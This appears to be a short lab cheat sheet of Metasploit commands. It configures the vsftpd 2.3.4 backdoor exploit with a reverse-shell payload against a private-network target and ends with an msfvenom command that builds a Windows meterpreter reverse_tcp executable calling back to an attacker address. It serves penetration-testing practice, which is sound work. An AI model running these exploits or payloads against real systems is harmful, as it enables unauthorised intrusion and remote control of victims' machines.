# Common Commands

## Starting Up

```bash
# Check if Metasploit installed
msfconsole --version

# Fresh install
sudo apt update && sudo apt install metasploit-framework -y

# Launch the interactive console
msfconsole
```

<img width="374" height="23" alt="Screenshot 2026-07-13 142158" src="https://github.com/user-attachments/assets/1fd541c8-720b-4043-b843-e55362768c51" />

<img width="882" height="551" alt="Screenshot 2026-07-13 133057" src="https://github.com/user-attachments/assets/3549fd51-efb2-4b35-9dfb-46fcb2afd301" />

<img width="404" height="378" alt="Screenshot 2026-07-13 140852" src="https://github.com/user-attachments/assets/322fe61c-4163-4b30-b5f6-b5cc4f3fe7b0" />

## Finding and Configuring a Module

```
# Search for a module by keyword/CVE
search type:exploit vsftpd

# Select a module
use exploit/unix/ftp/vsftpd_234_backdoor

# View required and optional settings
show options

# Set target and payload
set RHOSTS 10.0.2.4
set LHOST 10.0.2.5
set PAYLOAD cmd/unix/reverse

# Launch
exploit (or, run)
```
<img width="613" height="140" alt="Screenshot 2026-07-13 150534" src="https://github.com/user-attachments/assets/c1f8365b-f0b6-4f74-aa3e-9a7ed0e1392d" />

<img width="374" height="25" alt="Screenshot 2026-07-13 150650" src="https://github.com/user-attachments/assets/7aca9968-2686-41f9-8568-3e5699b11e5e" />

<img width="872" height="525" alt="Screenshot 2026-07-13 150848" src="https://github.com/user-attachments/assets/9b78042f-a53b-4b4c-a72c-56c86a2a3ffb" />

<img width="332" height="22" alt="Screenshot 2026-07-13 151131" src="https://github.com/user-attachments/assets/e4e30cfa-979d-410a-ba3b-3993962bdd4a" />

<img width="327" height="23" alt="Screenshot 2026-07-13 151145" src="https://github.com/user-attachments/assets/a26917cf-0d75-4357-a220-28b58d0734cc" />

<img width="707" height="454" alt="Screenshot 2026-07-13 142135" src="https://github.com/user-attachments/assets/1ee900d3-86b5-451e-aa41-e0472ed920d2" />



## Managing Sessions

```
# List active sessions
sessions -l

# Interact with a specific session
sessions -i 1

# Background the current session
background
```

## Payload Generation (msfvenom)

```bash
# Generate a Windows reverse shell executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.5 LPORT=4444 -f exe > payload.exe
```

---

